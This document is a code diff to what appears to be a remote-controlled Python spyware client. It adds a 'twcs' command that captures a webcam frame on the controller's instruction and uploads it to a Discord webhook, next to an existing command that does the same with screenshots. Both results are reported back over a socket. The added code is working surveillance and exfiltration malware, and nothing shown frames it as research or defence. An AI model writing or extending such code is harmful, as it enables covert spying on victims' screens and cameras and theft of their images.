@@ -9,6 +9,7 @@ import pyautogui
 import tempfile
 import random
 import discord_webhook
+import cv2
 from dotenv import load_dotenv
 from urllib.request import Request, urlopen
 
@@ -182,8 +183,10 @@ while True:
             end = str(['tss', "Unknown error occured."])
             
             screenshot = pyautogui.screenshot()
-            number = str(random.randint(0,1000))
+            
+            number = str(random.randint(0,10000))
             directory = tempfile.gettempdir() + "/abc-" + number + ".png"
+            
             screenshot.save(directory)
 
             webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
@@ -196,6 +199,30 @@ while True:
             if response:
                 end = str(['tss', str(response)])
             
+            end = end.encode()
+            s.send(end)
+            
+        if incoming_message[0] == "twcs":
+            end = str(['twcs', "Unknown error occured."])
+            
+            shot = cv2.VideoCapture(incoming_message[1])
+            result, image = shot.read()
+            
+            number = str(random.randint(0,10000))
+            directory = tempfile.gettempdir() + "/abc-" + number + ".png"
+            
+            cv2.imwrite(directory, image)
+            
+            webhook = discord_webhook.DiscordWebhook(WEBHOOK_URL)
+            
+            with open(directory, "rb") as f:
+                webhook.add_file(file=f.read(), filename="shot.png")
+                
+            response = webhook.execute()
+            
+            if response:
+                end = str(['twcs', str(response)])
+                
             end = end.encode()
             s.send(end)
             
